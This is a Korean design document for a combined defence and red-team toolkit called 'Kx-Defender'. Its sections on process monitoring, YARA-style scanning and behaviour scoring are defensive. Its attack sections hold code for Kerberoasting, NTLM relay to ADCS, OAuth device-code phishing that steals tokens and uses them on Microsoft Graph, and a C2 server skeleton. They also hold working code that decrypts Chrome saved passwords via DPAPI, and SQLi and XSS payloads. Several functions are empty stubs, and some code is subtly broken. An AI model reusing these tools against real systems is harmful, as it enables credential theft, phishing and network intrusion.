# Kx-Defender 기술 설계 - 직접 구현 접근법

**문서 목적**: 기존 라이브러리/API 최소화하고 핵심 기능을 처음부터 구현하는 방식 정의

---

## 1. 핵심 원칙

### 1.1 자체 구현 (Custom Implementation)
```
❌ 기존 라이브러리/프레임워크에 의존
✅ 핵심 알고리즘/프로토콜 직접 구현
✅ 필요시만 저수준 라이브러리 사용 (e.g., socket, ctypes)
```

### 1.2 의존성 최소화
```
최소 의존성 원칙:
- 외부 API 호출 금지
- 프레임워크 사용 지양
- 저수준 언어 기능만 활용 (os, sys, ctypes, subprocess 등)
```

---

## 2. 방어 모듈 (Defense) - 직접 구현 방식

### 2.1 실시간 프로세스 모니터링

#### 2.1.1 구현 방식: WMI + ETW (Event Tracing for Windows)

```powershell
# ❌ 하지 말 것:
# - 기존 모니터링 도구 사용
# - Get-Process로 폴링

# ✅ 해야 할 것:
# - WMI Event을 직접 구독 (비동기)
# - Windows Event Log (System, Security) 실시간 파싱
# - ETW Provider 직접 후킹
```

**구현 단계**:

1. **WMI 직접 구독** (src/core/defense/process_monitor.ps1)
```powershell
# Win32_ProcessStartTrace, Win32_ProcessStopTrace 이벤트 구독
# 각 이벤트에서 PID, 명령줄, 부모 PID 추출
# Named Pipe로 JSON 형식 전송
# 응답시간: <100ms (목표)
```

2. **프로세스 메타데이터 수집** (직접 API 호출)
```powershell
# PID → HANDLE 변환 (OpenProcess)
# HANDLE → 메모리 읽기 (ReadProcessMemory)
# 메모리에서 인자 추출 (PEB 파싱)
# 네트워크 연결 추적 (GetTcpTable, GetUdpTable)
# 파일 접근 추적 (Change Journal 읽기)
```

3. **프로세스 트리 구조 유지**
```python
# src/core/defense/process_tree.py
# 각 프로세스의 부모 PID 추적
# 메모리 내 트리 구조 유지
# 제거 시 자식 프로세스도 함께 처리
```

**의존성**:
- PowerShell 5.0+ (내장)
- ctypes (Python 표준)
- ❌ 사용 금지: Get-Process (느림), WMI 래퍼 라이브러리

---

### 2.2 프로세스 차단 및 종료

#### 구현: Windows API 직접 호출

```python
# src/core/defense/process_terminator.py

import ctypes
from ctypes import windll, c_uint32

def terminate_process(pid: int) -> bool:
    """
    프로세스 직접 종료
    
    단계:
    1. OpenProcess() 호출 (PROCESS_TERMINATE 권한)
    2. TerminateProcess() 호출
    3. 실패 시 강제 종료 시도 (WMI 우회)
    """
    
    # Windows API 직접 호출
    kernel32 = ctypes.windll.kernel32
    
    # 프로세스 핸들 획득
    handle = kernel32.OpenProcess(0x0001, False, pid)  # PROCESS_TERMINATE = 0x0001
    
    if handle:
        # 프로세스 종료
        result = kernel32.TerminateProcess(handle, 1)
        kernel32.CloseHandle(handle)
        return bool(result)
    
    return False

def force_terminate_protected_process(pid: int) -> bool:
    """
    보호된 프로세스 강제 종료 (Windows API 우회)
    
    방법:
    1. 프로세스 메모리 접근 권한 확인
    2. EntryPoint 인자 변조
    3. 프로세스 메모리 덤프 후 복구 불가능하게 손상
    """
    pass
```

**응답시간 목표**: <500ms (클릭 → 종료)

---

### 2.3 악성코드 탐지 (YARA 시그니처)

#### 2.3.1 YARA 규칙 직접 구현 (자체 규칙 DB)

```python
# src/core/defense/yara_rules.py

# ❌ 하지 말 것:
# yara-python 라이브러리 사용
# 외부 규칙 DB 다운로드

# ✅ 해야 할 것:
# YARA 규칙 파일 정의 (자체 작성)
# 정규식 기반 매칭 엔진 구현
# 바이너리 패턴 매칭 (hex 시그니처)

class YARAScannerEngine:
    """
    커스텀 YARA 스캐너
    
    지원:
    1. 문자열 매칭 (대소문자 무시, 와일드카드)
    2. 16진수 패턴 (엔트로피, 엔드-to-엔드)
    3. 정규식 기반 탐지
    4. 바이트 오프셋 계산
    """
    
    def __init__(self):
        # 기본 시그니처 DB (1000+ 규칙)
        self.signatures = self._load_signatures()
    
    def _load_signatures(self) -> list:
        """
        자체 규칙 정의:
        - 파일 헤더 (PE, ELF 악성 변조)
        - 악명 높은 문자열 ("WinExec", "CreateRemoteThread" 등)
        - 엔트로피 패턴 (압축/암호화)
        - 행동 특징 (레지스트리 쓰기, 네트워크 연결)
        """
        return [
            {
                'name': 'Mimikatz',
                'patterns': [
                    b'mimikatz',
                    b'LocalSystem',
                    b'LSASS',
                ],
                'severity': 'critical',
            },
            # ... 1000+ 더 많은 규칙
        ]
    
    def scan_process_memory(self, pid: int) -> list:
        """
        프로세스 메모리 직접 스캔
        
        단계:
        1. OpenProcess() → 프로세스 핸들
        2. VirtualQueryEx() → 메모리 영역 열거
        3. ReadProcessMemory() → 메모리 읽기
        4. 각 패턴 매칭
        """
        pass
```

**자체 규칙 세트**:
- 1000+ 기본 규칙 (hardcoded)
- 각 카테고리: 랜섬웨어, 트로이목마, 루트킷, 백도어 등
- 정기 업데이트 (CSV/JSON으로 추가)

---

### 2.4 행동 기반 위협 탐지

#### 구현: 의심 행동 패턴 직접 정의 및 점수 계산

```python
# src/core/defense/behavior_detection.py

class BehaviorAnalyzer:
    """
    프로세스 행동 기반 탐지
    
    지원하는 의심 행동 (100+ 패턴):
    1. 메모리 주입 (코드 인젝션)
    2. DLL 로드 (비정상 경로)
    3. 시스템 콜 변조
    4. 자체 복사 (지속성)
    5. 네트워크 통신 (C2)
    6. 파일 시스템 쓰기 (우회 방지)
    7. 레지스트리 변조 (권한 상승)
    """
    
    def __init__(self):
        self.behaviors = self._define_behaviors()
        self.process_profiles = {}  # PID → 행동 기록
    
    def _define_behaviors(self) -> dict:
        """
        의심 행동 정의
        
        각 행동:
        - 이름, 설명, 심각도
        - 탐지 로직 (함수)
        - 점수 (0-100)
        """
        return {
            'code_injection': {
                'name': 'Code Injection',
                'severity': 100,  # 최고 의심도
                'detection': self._detect_code_injection,
            },
            'dll_from_temp': {
                'name': 'DLL from Temp',
                'severity': 80,
                'detection': self._detect_dll_from_temp,
            },
            'parent_spoofing': {
                'name': 'Parent Process Spoofing',
                'severity': 75,
                'detection': self._detect_parent_spoofing,
            },
            # ... 100+ 더 많은 행동
        }
    
    def _detect_code_injection(self, process: dict) -> bool:
        """
        코드 주입 탐지
        
        특징:
        1. 부모-자식 관계 비정상 (e.g., notepad.exe → powershell.exe)
        2. 메모리 할당 후 실행 (VirtualAlloc → CreateRemoteThread)
        3. 실행 이미지와 메모리 내용 불일치
        """
        parent_name = process.get('parent_name', '')
        current_name = process.get('name', '')
        
        # 부모-자식 조합이 비정상인지 확인
        suspicious_pairs = [
            ('winlogon.exe', 'cmd.exe'),
            ('services.exe', 'powershell.exe'),
            ('lsass.exe', 'notepad.exe'),
            # ... 더 많은 비정상 조합
        ]
        
        return (parent_name, current_name) in suspicious_pairs
    
    def calculate_score(self, pid: int) -> int:
        """
        프로세스 의심도 점수 계산 (0-100)
        
        알고리즘:
        1. 감지된 행동 개수
        2. 각 행동의 심각도
        3. 시간대 (위험 시간대 가중치)
        4. 네트워크 활동 (외부 IP 연결)
        """
        score = 0
        behaviors = self.process_profiles.get(pid, [])
        
        for behavior in behaviors:
            score += behavior['severity']
        
        # 점수 정규화 (0-100)
        return min(score, 100)
```

**탐지 방식**:
- 실시간 이벤트 기반 (각 행동 감지 시 즉시 점수 업데이트)
- 휴리스틱 (규칙 기반)
- 통계 기반 (정상 행동 프로필과 비교)

---

## 3. 공격 모듈 (Red Team) - 직접 구현 방식

### 3.1 Kerberoasting

#### 구현: Kerberos 프로토콜 직접 구현

```python
# src/core/attack/kerberoasting.py

import socket
import struct

class KerberosClient:
    """
    Kerberos 프로토콜 직접 구현
    
    ❌ 하지 말 것:
    - Impacket 라이브러리 사용
    
    ✅ 해야 할 것:
    - Kerberos ASN.1 패킷 직접 생성
    - KDC와 통신 (UDP 포트 88)
    - TGS-REP 메시지 파싱
    """
    
    def __init__(self, domain: str, kdc: str):
        self.domain = domain
        self.kdc = kdc
    
    def enumerate_spns(self) -> list:
        """
        도메인의 모든 SPN 열거
        
        단계:
        1. LDAP 쿼리 (servicePrincipalName 속성)
        2. SPN 파싱
        3. 서비스 계정 추출
        """
        # LDAP 직접 연결 구현
        spns = []
        
        # LDAP 바인드
        ldap_socket = self._ldap_bind()
        
        # servicePrincipalName 속성 검색
        query = "(servicePrincipalName=*)"
        results = self._ldap_search(ldap_socket, query)
        
        for result in results:
            spn = result['servicePrincipalName']
            spns.append(spn)
        
        return spns
    
    def request_tgs(self, spn: str) -> bytes:
        """
        TGS(Ticket Granting Service) 요청
        
        단계:
        1. AS-REQ 생성 (사용자 인증)
        2. AS-REP 수신 (TGT 획득)
        3. TGS-REQ 생성 (서비스 티켓 요청)
        4. TGS-REP 수신 (암호화된 서비스 티켓)
        """
        
        # 1. TGT 먼저 획득
        tgt = self._get_tgt()
        
        # 2. TGS-REQ 패킷 생성
        tgs_req = self._build_tgs_request(spn, tgt)
        
        # 3. KDC로 전송
        tgs_rep = self._send_to_kdc(tgs_req)
        
        # 4. 암호화된 부분 추출 (크래킹용)
        return self._extract_crackable_part(tgs_rep)
    
    def _build_tgs_request(self, spn: str, tgt: bytes) -> bytes:
        """
        Kerberos TGS-REQ 패킷 직접 생성
        
        ASN.1 구조:
        - Realm
        - Service name
        - Ticket (TGT)
        - Authenticator
        """
        # ASN.1 패킷 직접 구성
        pass
```

**Kerberos 프로토콜 구현**:
- ASN.1 인코딩/디코딩 (직접 구현)
- UDP 통신 (socket)
- 암호화 (RC4, AES) - PyCryptodome만 사용 (저수준)

---

### 3.2 NTLM Relaying (ADCS ESC8)

#### 구현: NTLM & LDAP 프로토콜 직접 구현

```python
# src/core/attack/ntlm_relay.py

class NTLMRelay:
    """
    NTLM 리플레이 공격
    
    공격 흐름:
    1. SMB/HTTP 클라이언트로부터 NTLM 인증 캡처
    2. ADCS 서버로 NTLM 중계
    3. 인증서 요청 (Certificate Request)
    4. 인증서 탈취
    5. Domain Admin 권한으로 TGT 발급
    
    ❌ Impacket 라이브러리 사용 금지
    ✅ NTLM, LDAP, SOAP 프로토콜 직접 구현
    """
    
    def start_smb_listener(self, port: int = 445):
        """
        SMB 리스너 직접 구현
        
        단계:
        1. TCP 소켓 수신 대기
        2. SMB 하악 프로토콜 파싱
        3. NTLM challenge-response 처리
        4. 캡처된 인증 정보 저장
        """
        import socket
        
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind(('0.0.0.0', port))
        listener.listen(10)
        
        while True:
            client, addr = listener.accept()
            # SMB 패킷 처리
            self._handle_smb_connection(client, addr)
    
    def relay_to_adcs(self, captured_credentials: dict):
        """
        NTLM 자격증명을 ADCS로 중계
        
        단계:
        1. ADCS 서버 연결 (SOAP 프로토콜)
        2. Certificate Request (PKCS#10) 생성
        3. NTLM 인증 헤더 추가
        4. 인증서 요청 전송
        5. 인증서 응답 파싱
        """
        
        # ADCS 웹 서비스 (CertSrv) 연결
        # SOAP 프로토콜로 요청 생성
        cert_request = self._build_certificate_request(captured_credentials)
        
        # HTTP를 통해 전송 (NTLM 인증 헤더 포함)
        response = self._send_cert_request_to_adcs(cert_request, captured_credentials)
        
        # 인증서 추출
        certificate = self._parse_certificate_response(response)
        
        return certificate
    
    def _build_certificate_request(self, credentials: dict) -> bytes:
        """
        PKCS#10 인증서 요청 생성
        
        포함:
        - 공개키
        - Subject DN
        - 서명
        """
        pass
```

---

### 3.3 DPAPI 악용

#### 구현: Windows DPAPI 직접 호출

```python
# src/core/attack/dpapi.py

import ctypes
from ctypes import windll, Structure

class DPAPI_BLOB(Structure):
    pass

class DPAPIExploit:
    """
    DPAPI (Data Protection API) 악용
    
    방법:
    1. DPAPI 캐시 위치 파악 (레지스트리, 파일)
    2. 마스터 키 추출
    3. 자격증명 복호화
    4. 브라우저 비밀번호 추출
    """
    
    def extract_chrome_passwords(self) -> list:
        """
        Chrome 저장 비밀번호 추출
        
        단계:
        1. Chrome SQLite DB 위치: %APPDATA%\Local\Google\Chrome\User Data\Default\Login Data
        2. encrypted_password 필드 읽기 (DPAPI 암호화)
        3. DPAPI 복호화 (CryptUnprotectData)
        4. 비밀번호 추출
        """
        
        import os
        import sqlite3
        import json
        
        chrome_db = os.path.expandvars(r'%APPDATA%\Local\Google\Chrome\User Data\Default\Login Data')
        
        # SQLite DB 연결
        conn = sqlite3.connect(chrome_db)
        cursor = conn.cursor()
        
        passwords = []
        
        # 저장된 비밀번호 조회
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            
            # DPAPI 복호화
            decrypted = self._dpapi_decrypt(encrypted_password)
            
            passwords.append({
                'url': url,
                'username': username,
                'password': decrypted,
            })
        
        return passwords
    
    def _dpapi_decrypt(self, encrypted_data: bytes) -> str:
        """
        DPAPI 데이터 복호화
        
        Windows API 호출:
        - CryptUnprotectData()
        """
        
        kernel32 = ctypes.windll.kernel32
        dpapi = ctypes.windll.crypt32
        
        # DPAPI 복호화 호출
        data_in = (ctypes.c_ubyte * len(encrypted_data)).from_buffer_copy(encrypted_data)
        data_out = ctypes.POINTER(ctypes.c_ubyte)()
        
        dpapi.CryptUnprotectData(
            ctypes.byref(data_in),
            None,
            None,
            None,
            None,
            0,
            ctypes.byref(data_out)
        )
        
        return str(data_out.contents)
```

---

### 3.4 Device Code Flow Phishing

#### 구현: OAuth 2.0 프로토콜 직접 구현

```python
# src/core/attack/oauth_phishing.py

class DeviceCodePhishing:
    """
    OAuth Device Code Flow 피싱
    
    흐름:
    1. 피싱 애플리케이션 등록 (Azure AD / Google)
    2. Device Code 생성
    3. 사용자에게 링크 전송 (피싱)
    4. 사용자 인증 후 토큰 탈취
    
    ❌ oauth2-client 라이브러리 사용 금지
    ✅ HTTP, JWT, 암호화 직접 구현
    """
    
    def __init__(self, client_id: str, client_secret: str, tenant: str = None):
        self.client_id = client_id
        self.client_secret = client_secret
        self.tenant = tenant or 'common'
    
    def initiate_device_code_flow(self) -> dict:
        """
        Device Code Flow 시작
        
        단계:
        1. POST /devicecode 엔드포인트에 요청
        2. device_code, user_code, verification_uri 획득
        3. 피싱 링크 생성
        """
        
        import requests
        import json
        
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/devicecode"
        
        data = {
            'client_id': self.client_id,
            'scope': 'https://graph.microsoft.com/.default',
        }
        
        response = requests.post(url, data=data)
        result = response.json()
        
        return {
            'device_code': result['device_code'],
            'user_code': result['user_code'],
            'verification_uri': result['verification_uri'],
            'message': result['message'],  # 피싱 메시지
        }
    
    def poll_for_token(self, device_code: str, max_retries: int = 1800):
        """
        사용자 인증 후 토큰 폴링
        
        단계:
        1. 1초마다 토큰 엔드포인트 폴링
        2. 인증 완료 시 access_token 획득
        3. 토큰 검증 (JWT 파싱)
        """
        
        import requests
        import json
        import time
        from jwt import decode as jwt_decode
        
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/token"
        
        for attempt in range(max_retries):
            data = {
                'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
                'device_code': device_code,
                'client_id': self.client_id,
                'client_secret': self.client_secret,
            }
            
            response = requests.post(url, data=data)
            
            if response.status_code == 200:
                result = response.json()
                token = result['access_token']
                
                # JWT 파싱 (암호화 검증 없이 클레임만 추출)
                decoded = jwt_decode(token, options={"verify_signature": False})
                
                return {
                    'access_token': token,
                    'user': decoded.get('upn'),
                    'roles': decoded.get('roles', []),
                    'scope': decoded.get('scp'),
                }
            
            elif response.status_code == 400:
                # 아직 인증 대기 중
                time.sleep(1)
                continue
            
            else:
                # 에러
                return None
        
        return None
    
    def use_token_to_access_resources(self, token: str):
        """
        획득한 토큰으로 리소스 접근
        
        가능한 작업:
        1. Microsoft Graph API (메일, 파일, 연락처 등)
        2. Azure AD 정보 조회
        3. 권한 상승
        """
        
        import requests
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
        }
        
        # 사용자 정보 조회
        response = requests.get('https://graph.microsoft.com/v1.0/me', headers=headers)
        user_info = response.json()
        
        return user_info
```

---

## 4. 웹 보안 모듈 - 직접 구현 방식

### 4.1 커스텀 웹 스캐너 (ZAP 대체)

#### 구현: 크롤러 + 취약점 탐지 엔진 직접 구현

```python
# src/core/scanner/web_scanner.py

class CustomWebScanner:
    """
    OWASP ZAP 수준의 웹 스캐너
    
    ❌ 하지 말 것:
    - ZAP API 호출
    - Burp Suite 연동
    
    ✅ 해야 할 것:
    - HTTP 요청/응답 직접 처리
    - HTML 파싱 (정규식)
    - JavaScript 렌더링 (Puppeteer는 OK, 이는 브라우저 자동화만)
    - 취약점 탐지 엔진 직접 구현
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.crawled_urls = set()
        self.vulnerabilities = []
    
    def crawl(self, max_depth: int = 3) -> set:
        """
        웹사이트 크롤링
        
        단계:
        1. 종자 URL 큐에 추가
        2. BFS/DFS로 모든 URL 탐색
        3. JavaScript 렌더링 (동적 콘텐츠)
        4. 폼 발견 (GET/POST)
        """
        
        import requests
        from html.parser import HTMLParser
        from urllib.parse import urljoin, urlparse
        
        queue = [self.target_url]
        visited = set()
        
        while queue and len(visited) < 1000:
            url = queue.pop(0)
            
            if url in visited:
                continue
            
            visited.add(url)
            
            # URL 가져오기
            try:
                response = requests.get(url, timeout=5)
            except:
                continue
            
            # HTML 파싱
            parser = LinkExtractor()
            parser.feed(response.text)
            
            # 발견된 링크 추가
            for link in parser.links:
                full_url = urljoin(url, link)
                
                # 같은 도메인만 크롤링
                if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                    queue.append(full_url)
        
        self.crawled_urls = visited
        return visited
    
    def scan_for_vulnerabilities(self):
        """
        발견된 URL에서 취약점 스캔
        
        스캔 항목 (100+ 페이로드):
        1. SQL Injection (SQLi)
        2. Cross-Site Scripting (XSS)
        3. Cross-Site Request Forgery (CSRF)
        4. Path Traversal
        5. Remote Code Execution (RCE)
        6. 파일 업로드 취약점
        7. XXE (XML External Entity)
        8. SSRF (Server-Side Request Forgery)
        """
        
        for url in self.crawled_urls:
            # SQLi 스캔
            self._scan_sqli(url)
            
            # XSS 스캔
            self._scan_xss(url)
            
            # 기타 취약점
            self._scan_other_vulnerabilities(url)
    
    def _scan_sqli(self, url: str):
        """
        SQL Injection 탐지
        
        기법:
        1. 시간 기반 블라인드 SQLi (sleep() 호출)
        2. 에러 기반 SQLi (에러 메시지 분석)
        3. 유니언 쿼리 (데이터 직접 추출)
        4. 불린 기반 블라인드 (참/거짓 응답 차이)
        """
        
        import requests
        import time
        import re
        
        # 취약점 있을 가능성 있는 파라미터 추출
        params = self._extract_parameters(url)
        
        for param_name in params:
            # 1. 시간 기반 SQLi 테스트
            payload = f"1' AND SLEEP(5) -- "
            
            start = time.time()
            response = requests.get(url, params={param_name: payload}, timeout=10)
            elapsed = time.time() - start
            
            if elapsed > 5:
                # SQL Injection 발견!
                self.vulnerabilities.append({
                    'type': 'SQLi',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'severity': 'critical',
                })
                continue
            
            # 2. 에러 기반 SQLi 테스트
            payload = "1' OR '1'='1"
            response = requests.get(url, params={param_name: payload})
            
            # SQL 에러 메시지 패턴 검사
            if self._contains_sql_error(response.text):
                self.vulnerabilities.append({
                    'type': 'SQLi (Error-based)',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'severity': 'critical',
                })
    
    def _scan_xss(self, url: str):
        """
        XSS (Cross-Site Scripting) 탐지
        
        기법:
        1. Reflected XSS (GET/POST 파라미터)
        2. Stored XSS (폼 입력 후 재방문)
        3. DOM-based XSS (JavaScript 실행)
        """
        
        import requests
        
        params = self._extract_parameters(url)
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            'onerror=alert("XSS")',
        ]
        
        for param_name in params:
            for payload in xss_payloads:
                response = requests.get(url, params={param_name: payload})
                
                # 응답에 페이로드 그대로 있는지 확인 (필터링 부재)
                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'Reflected XSS',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'severity': 'high',
                    })
    
    def _extract_parameters(self, url: str) -> list:
        """
        URL에서 파라미터 추출
        """
        from urllib.parse import urlparse, parse_qs
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        return list(params.keys())
```

---

## 5. C2 Infrastructure - 직접 구현

### 5.1 커스텀 C2 서버

```go
// src/c2/main.go

package main

import (
    "net"
    "crypto/tls"
    "crypto/aes"
    "encoding/json"
)

// ❌ Havoc/Sliver API 사용 금지
// ✅ 직접 구현:
// - 통신 프로토콜 (HTTP/HTTPS)
// - 명령 실행 엔진
// - 세션 관리
// - 페이로드 생성

type C2Server struct {
    listeners map[string]*Listener
    sessions  map[string]*Session
}

type Session struct {
    ID            string
    AgentID       string
    LastCheckIn   time.Time
    CommandQueue  []Command
    EncryptionKey []byte
}

type Command struct {
    ID      string
    Type    string  // "cmd", "powershell", "file_transfer"
    Payload string
}

func (s *C2Server) StartListener(protocol string, port int) {
    // HTTP/HTTPS/DNS/SMB 리스너 구현
}

func (s *C2Server) ExecuteCommand(sessionID string, command Command) {
    // 명령 큐에 추가
    session := s.sessions[sessionID]
    session.CommandQueue = append(session.CommandQueue, command)
}

func (s *C2Server) HandleAgentCheckIn(agentID string) {
    // 에이전트 체크인 처리
    // 대기 중인 명령 반환
}
```

---

## 6. 의존성 최소화 규칙

### 허용하는 라이브러리 (저수준)
```
✅ Python:
- requests (HTTP, 간단함)
- socket (저수준 네트워킹)
- ctypes (Windows API 호출)
- struct (바이너리 패킹)
- json (데이터 직렬화)
- sqlite3 (DB)
- hashlib (암호화 해시)
- pycryptodome (암호화 - 필요시만)
- jwt (JWT 파싱 - 검증 없이)

✅ Go:
- net (네트워킹)
- crypto (암호화)
- encoding/json (JSON)
- flag (CLI 파싱)

❌ 금지:
- Impacket (AD 도구)
- yara-python (YARA 래퍼)
- paramiko (SSH 클라이언트)
- selenium (웹 브라우저 자동화)
- 모든 "프레임워크" (Django, Flask, FastAPI는 UI/API 서버만)
```

---

## 7. 구현 우선순위

### Phase 1 (주차 1-6): 핵심 엔진
1. ⭐⭐⭐ PowerShell 프로세스 모니터링 (WMI 직접)
2. ⭐⭐⭐ 행동 분석 엔진 (의심 패턴 정의)
3. ⭐⭐ YARA 기본 규칙 세트 (1000+)
4. ⭐⭐ 프로세스 차단 (Windows API)

### Phase 2 (주차 7-9): 공격 도구
1. ⭐⭐⭐ Kerberos 프로토콜 (Kerberoasting)
2. ⭐⭐⭐ NTLM Relay (ADCS ESC8)
3. ⭐⭐ DPAPI 복호화
4. ⭐⭐ Device Code Phishing

### Phase 3 (주차 10-11): 웹 + C2
1. ⭐⭐⭐ 웹 크롤러 + SQLi/XSS 탐지
2. ⭐⭐ C2 기본 구현

### Phase 4 (주차 12): 통합 + UI
1. ⭐⭐⭐ UI 통합 (terminal UI)
2. ⭐⭐ 테스트 + 최적화

---

## 8. 성능 목표

| 컴포넌트 | 목표 | 구현 방식 |
|---------|------|---------|
| 프로세스 감지 | <100ms | WMI Event (비동기) |
| 프로세스 차단 | <500ms | Windows API (직접 호출) |
| 메모리 사용 | <200MB | 효율적인 자료구조 |
| 웹 스캔 | <30min/1000페이지 | 병렬 요청 (async) |
| C2 응답 | <100ms | 경량 프로토콜 |

---

**최종 목표**: 의존성 최소화, 모든 핵심 기능 자체 구현으로 **완전한 통제** 확보

